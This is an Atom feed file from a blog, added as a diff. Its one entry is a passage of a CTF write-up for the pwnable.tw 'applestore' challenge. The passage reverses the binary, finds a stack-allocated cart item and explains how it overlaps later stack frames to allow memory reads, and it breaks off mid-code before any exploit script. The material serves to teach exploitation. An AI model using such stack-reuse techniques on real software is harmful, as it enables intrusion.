@@ -1,0 +1,461 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
+	<title> - rce</title>
+	<link href="/tags/rce/atom.xml" rel="self" type="application/atom+xml"/>
+  <link href="/"/>
+	<generator uri="https://www.getzola.org/">Zola</generator>
+	<updated>2020-11-06T00:00:00+00:00</updated>
+	<id>/tags/rce/atom.xml</id>
+	<entry xml:lang="en">
+		<title>pwnable.tw - applestore</title>
+		<published>2020-08-27T00:00:00+00:00</published>
+		<updated>2020-11-06T00:00:00+00:00</updated>
+		<link href="/posts/pwnable-tw-applestore/" type="text/html"/>
+		<id>/posts/pwnable-tw-applestore/</id>
+		<content type="html">&lt;h1 id=&quot;challenge&quot;&gt;Challenge&lt;&#x2F;h1&gt;
+&lt;blockquote&gt;
+&lt;p&gt;tomcr00se rooted the galaxy S5, but we need you to jailbreak the iPhone8!&lt;&#x2F;p&gt;
+&lt;p&gt;nc chall.pwnable.tw 10104&lt;&#x2F;p&gt;
+&lt;&#x2F;blockquote&gt;
+&lt;p&gt;We&#x27;re also given a &lt;a href=&quot;https:&#x2F;&#x2F;pwnable.tw&#x2F;static&#x2F;chall&#x2F;applestore&quot;&gt;binary&lt;&#x2F;a&gt; and 
+&lt;a href=&quot;https:&#x2F;&#x2F;pwnable.tw&#x2F;static&#x2F;libc&#x2F;libc_32.so.6&quot;&gt;libc&lt;&#x2F;a&gt; shared executable.&lt;&#x2F;p&gt;
+&lt;h1 id=&quot;reversing&quot;&gt;Reversing&lt;&#x2F;h1&gt;
+&lt;p&gt;When reversing binaries, I usually run the binary and compare its execution alongside the disassemby+pseudocode. 
+When we run the given binary, we&#x27;re greeted by a menu with 6 options:&lt;&#x2F;p&gt;
+&lt;span id=&quot;continue-reading&quot;&gt;&lt;&#x2F;span&gt;
+&lt;p&gt;&lt;img src=&quot;&#x2F;posts&#x2F;pwnable-tw-applestore&#x2F;5f4789fe5f6cee02e28f044e.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;Going through and reversing each function isn&#x27;t too difficult. The application allows us to view products, 
+add, remove, and list items in our cart, and checkout.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;input-handler&quot;&gt;Input Handler&lt;&#x2F;h2&gt;
+&lt;p&gt;The main function sets up I&#x2F;O buffering, prints out the menu, clears a global variable, and calls the following function
+to handle input:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
+&lt;code&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;void &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#795da3;&quot;&gt;handler&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;void&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;) {
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; iVar1;
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; input;
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; in_GS_OFFSET;
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;char&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; input_str [&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;22&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;];
+  
+  iVar1 &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= *&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;int *&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)(in_GS_OFFSET &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x14&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;do &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;{
+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;printf&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;&amp;gt; &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;fflush&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(stdout);
+    my_read(input_str,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x15&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+    input &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;atoi&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(input_str);
+    &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;switch&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(input) {
+    &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;default&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;:
+      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;It&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;\&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;s not a choice! Idiot.&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+      &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;break&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;;
+    &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;case &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;:
+      list();
+      &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;break&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;;
+    &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;case &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;:
+      add();
+      &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;break&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;;
+    &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;case &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;:
+      delete();
+      &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;break&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;;
+    &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;case &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;4&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;:
+      cart();
+      &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;break&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;;
+    &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;case &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;5&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;:
+      checkout();
+      &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;break&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;;
+    &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;case &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;6&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;:
+      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;Thank You for Your Purchase!&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+      &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(iVar1 &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;!= *&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;int *&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)(in_GS_OFFSET &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x14&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)) {
+        __stack_chk_fail();
+      }
+      &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;return&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;;
+    }
+  } &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;while&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;( &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;true &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+}
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;The &lt;code&gt;my_read&lt;&#x2F;code&gt; function simply reads n characters into the specified buffer.  The &lt;code&gt;list&lt;&#x2F;code&gt; function prints out a list of products:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
+&lt;code&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;void &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#795da3;&quot;&gt;list&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;void&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;) {
+  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;=== Device List ===&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;printf&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;%d&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;: iPhone 6 - $&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;%d\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;199&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;printf&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;%d&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;: iPhone 6 Plus - $&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;%d\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;299&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;printf&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;%d&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;: iPad Air 2 - $&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;%d\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;499&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;printf&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;%d&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;: iPad Mini 3 - $&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;%d\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;4&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;399&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;printf&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;%d&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;: iPod Touch - $&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;%d\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;5&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;199&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;return&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;;
+}
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;&lt;h2 id=&quot;adding-removing-items&quot;&gt;Adding&#x2F;Removing Items&lt;&#x2F;h2&gt;
+&lt;p&gt;The &lt;code&gt;add&lt;&#x2F;code&gt; and &lt;code&gt;delete&lt;&#x2F;code&gt; functions are straightforward. They act on a doubly-linked list and respectively add an item or 
+remove an item. The &lt;code&gt;delete&lt;&#x2F;code&gt; function allows us to specify the index to delete, while &lt;code&gt;add&lt;&#x2F;code&gt; inserts a new item at the end of the linked list.&lt;&#x2F;p&gt;
+&lt;p&gt;The head node of the list is stored in a global variable named &lt;code&gt;myCart&lt;&#x2F;code&gt;. I defined the following struct to represent 
+each node in the list:&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;&#x2F;posts&#x2F;pwnable-tw-applestore&#x2F;5f478a235f6cee02e28f0450.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;checkout&quot;&gt;Checkout&lt;&#x2F;h2&gt;
+&lt;p&gt;The checkout function is interesting and contains a clear vulnerability:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
+&lt;code&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;void &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#795da3;&quot;&gt;checkout&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;void&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;) {
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; iVar1;
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; in_GS_OFFSET;
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; total;
+  cart_item item;
+  
+  iVar1 &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= *&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;int *&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)(in_GS_OFFSET &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x14&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+  total &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;cart();
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(total &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x1c06&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;) {
+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;*: iPhone 8 - $1&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+    asprintf((&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;char **&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;&amp;amp;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;item,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;iPhone 8&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+    item.price &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;;
+    insert(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;&amp;amp;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;item);
+    total &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x1c07&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;;
+  }
+  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;printf&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;Total: $&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;%d\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;,total);
+  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;Want to checkout? Maybe next time!&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(iVar1 &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;!= *&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;int *&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)(in_GS_OFFSET &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x14&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)) {
+    __stack_chk_fail();
+  }
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;return&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;;
+}
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;This function calls &lt;code&gt;cart&lt;&#x2F;code&gt; which displays all of the items in the cart and returns the total value of the items in the 
+cart. If the total value of the cart is 0x1c06 (7174 in decimal), then a discounted iPhone 8 is added to our doubly-linked list.&lt;&#x2F;p&gt;
+&lt;p&gt;However, this new item isn&#x27;t dynamically allocated using &lt;code&gt;malloc&lt;&#x2F;code&gt; -- it&#x27;s stored on the stack. This means that its 
+value can change if another function&#x27;s stack frame overlaps its location in memory.&lt;&#x2F;p&gt;
+&lt;h1 id=&quot;exploitation&quot;&gt;Exploitation&lt;&#x2F;h1&gt;
+&lt;h2 id=&quot;triggering-the-vulnerability&quot;&gt;Triggering the vulnerability&lt;&#x2F;h2&gt;
+&lt;p&gt;The stack item is only added if the total is 7174. It&#x27;s not hard to find a combination of items that add up to 7174:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
+&lt;code&gt;&lt;span style=&quot;color:#323232;&quot;&gt;iPhone 6    ($199)  x  19 = 3781
+iPad Air 2  ($499)  x   6 = 2994
+iPad Mini 3 ($399)  x   1 =  399
+Total                     = 7174
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Now we can add a stack address to the linked list by checking out. In this case, the vulnerable cart item will be at 
+index 27 (as displayed by the binary).&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;overwriting-the-item&quot;&gt;Overwriting the item&lt;&#x2F;h2&gt;
+&lt;p&gt;Since the &lt;code&gt;handler&lt;&#x2F;code&gt; function continuously loops until the user chooses to exit, its stack frame remains consistent at 
+the same address. Thus, the stack frames of functions it calls will start at the same address.&lt;&#x2F;p&gt;
+&lt;p&gt;The diagram below shows the stack layout when calling &lt;code&gt;checkout&lt;&#x2F;code&gt; side-by-side with the stack layout when calling &lt;code&gt;delete&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;object data=&quot;&#x2F;posts&#x2F;pwnable-tw-applestore&#x2F;5f478a365f6cee02e28f0452.svg&quot; type=&quot;image&#x2F;svg+xml&quot;&gt;&lt;&#x2F;object&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;There is an overlap of the memory referenced by the added cart item and the buffer for the input string in the &lt;code&gt;delete&lt;&#x2F;code&gt; 
+function. Thus, any operations on the stack cart item will reference our controlled buffer. Luckily, this same overlap 
+is consistent among &lt;code&gt;add&lt;&#x2F;code&gt;, &lt;code&gt;delete&lt;&#x2F;code&gt;, and &lt;code&gt;cart&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;reading-arbitrary-addresses&quot;&gt;Reading arbitrary addresses&lt;&#x2F;h2&gt;
+&lt;p&gt;The cart function iterates through all of the values in the doubly-linked list and prints their name and price:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
+&lt;code&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;int &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#795da3;&quot;&gt;cart&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;void&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;) {
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; iVar1;
